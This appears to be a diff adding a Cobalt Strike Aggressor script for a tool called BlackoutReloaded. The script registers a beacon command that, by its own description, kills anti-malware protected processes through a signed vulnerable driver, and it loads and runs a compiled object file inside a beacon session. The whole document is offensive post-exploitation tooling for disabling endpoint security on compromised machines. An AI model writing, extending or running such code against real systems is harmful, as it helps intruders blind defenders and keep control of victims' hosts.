@@ -1,0 +1,29 @@
+# Register help
+beacon_command_register("blackout_reloaded", 
+	"Kill any anti-malware protected process using a new signed vulnerable driver.",
+	"Synopsis: blackout_reloaded [pid]\nSynopsis: blackout_reloaded [process name]"
+);
+
+# Register alias
+alias blackout_reloaded {
+	local('$file $handle $object $args $pid');
+
+	# Log the current task
+	btask($1, "Tasked beacon to run BlackoutReloaded!");
+
+	# Find and log object file
+	$file = script_resource("BlackoutReloaded.o");
+	blog($1, $file);
+
+	# Read the object file
+	$handle = openf($file);
+	$object = readb($handle, -1);
+	closef($handle);
+
+	# Pack empty arguments
+	$args = bof_pack($1, "z", $2);
+	
+	# Run the object file
+	beacon_inline_execute($1, $object, "go", $args);
+}
+
